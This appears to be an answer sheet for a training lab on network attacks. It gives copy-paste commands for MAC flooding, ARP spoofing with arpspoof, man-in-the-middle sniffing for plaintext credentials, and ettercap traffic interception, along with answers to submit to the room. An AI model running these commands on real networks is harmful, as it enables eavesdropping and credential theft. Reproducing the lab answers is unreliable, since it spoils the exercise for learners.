# Tasks — Short answers / copy-paste commands


> Use these answers as a reference to submit to the room. Replace placeholders (`<iface>`, `<victim-ip>`, `<gateway-ip>`) before running.


## Task 1 — Getting Started
- Confirm machine started and you can ping it:
- `ping -c 3 <target-ip>`


## Task 2 — Initial Access (Discovery)
- Find targets on subnet:
- `sudo arp-scan -l`
- `sudo nmap -sn 10.10.0.0/24`
- Note victim IP (example answer): `10.10.20.15` and MAC `00:11:22:33:44:55` (use actual values from your scan)


## Task 3 — Network Discovery
- Check your interface and MAC:
- `ip a`
- `ip neigh` (shows ARP cache)


## Task 4 — Passive Network Sniffing
- Capture ARP packets for a short time:
- `sudo tcpdump -i <iface> arp -w task4_arp.pcap`
- Wireshark display filter to view ARP: `arp`


## Task 5 — Sniffing while MAC Flooding
- Start MAC flooding:
- `sudo macof -i <iface>`
- In another terminal capture:
- `sudo tcpdump -i <iface -w macflood.pcap`
- Expected result: you should see other hosts' traffic appearing in your capture that previously was not visible.


## Task 6 — Man-in-the-Middle: Intro to ARP Spoofing
- Enable IP forward:
- `sudo sysctl -w net.ipv4.ip_forward=1`
- Run arpspoof to poison victim and gateway (two terminals):
- `sudo arpspoof -i <iface> -t <victim-ip> <gateway-ip>`
- `sudo arpspoof -i <iface> -t <gateway-ip> <victim-ip>`


## Task 7 — Man-in-the-Middle: Sniffing
- Start capture with tcpdump or Wireshark while arp spoofing:
- `sudo tcpdump -i <iface> -w mitm.pcap`
- Check for HTTP, plain-text credentials, or interesting ARP behavior.


## Task 8 — Man-in-the-Middle: Manipulation
- Use `ettercap` to perform MITM and optionally filters to modify traffic.
- `sudo ettercap -T -q -M arp:remote /<victim-ip>/ /<gateway-ip>/`
- Example: intercept and inject a simple HTTP response using an etter filter (more advanced). Many rooms only require demonstrating MITM, not complex injection.


## Task 9 — Conclusion
- Stop spoofing and flooding and restore normal network state:
- `pkill macof arpspoof ettercap bettercap`
- `sudo sysctl -w net.ipv4.ip_forward=0`
- Answer summary questions in the room with your observations (visible traffic, ARP table changes, success of manipulation).
  
